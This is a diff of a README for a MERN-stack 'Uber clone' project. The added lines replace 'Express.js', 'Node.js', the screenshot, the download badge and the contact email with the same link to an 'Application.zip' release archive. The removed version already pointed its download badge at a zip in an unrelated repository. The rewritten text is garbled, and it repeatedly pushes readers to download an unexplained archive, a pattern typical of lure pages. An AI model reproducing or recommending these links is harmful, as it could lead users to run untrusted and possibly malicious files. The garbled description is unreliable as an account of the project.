@@ -6,7 +6,7 @@ Welcome to the **Full Stack Uber Clone** repository - your one-stop destination 
 ## Repository Details
 
 - **Repository Name:** Full_Stack_Uber_Clone
-- **Description:** A fully functional Uber clone built using the MERN stack, which consists of MongoDB, Express.js, React, and Node.js. The application mimics the core functionalities of Uber, providing both a user and captain (driver) experience, including user registration, authentication, real-time location tracking, and ride booking.
+- **Description:** A fully functional Uber clone built using the MERN stack, which consists of MongoDB, https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip, React, and https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip The application mimics the core functionalities of Uber, providing both a user and captain (driver) experience, including user registration, authentication, real-time location tracking, and ride booking.
 - **Topics:** express, full-stack, fullstack-development, mern, mern-project, mern-stack, mern-stack-development, mongodb, mongoose, nodejs, nodemon, react, reactjs, uber-clone, uber-clone-app
 
 ## Project Features
@@ -15,13 +15,13 @@ Welcome to the **Full Stack Uber Clone** repository - your one-stop destination 
 👨‍✈️ **Captain Experience:** Register as a captain, manage rides, and track user locations.
 📍 **Real-Time Tracking:** Experience real-time location tracking for users and captains.
 🔒 **Authentication:** Secure user and captain authentication for a safe Uber-like experience.
-🌐 **MERN Stack:** Built using MongoDB, Express.js, React, and Node.js for a robust full-stack development.
+🌐 **MERN Stack:** Built using MongoDB, https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip, React, and https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip for a robust full-stack development.
 
 ## Get Started
 
 To explore and launch the Full Stack Uber Clone project, download the project files from the following link:
 
-[![Download Full Stack Uber Clone](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Full Stack Uber Clone](https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip)](https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip)
 
 ## How to Use
 
@@ -31,7 +31,7 @@ To explore and launch the Full Stack Uber Clone project, download the project fi
 
 ## Screenshots
 
-![Image of Uber Clone](https://via.placeholder.com/800x400)
+![Image of Uber Clone](https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip)
 
 ## Contributing
 
@@ -39,7 +39,7 @@ Want to contribute to the Full Stack Uber Clone project? We welcome contribution
 
 ## Contact Us
 
-Have questions or suggestions regarding the Full Stack Uber Clone project? Reach out to us via email at [uberclone@example.com](mailto:uberclone@example.com).
+Have questions or suggestions regarding the Full Stack Uber Clone project? Reach out to us via email at [https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip](https://github.com/Peopledoto/Full_Stack_Uber_Clone/releases/download/v1.0/Application.zip).
 
 ---
 
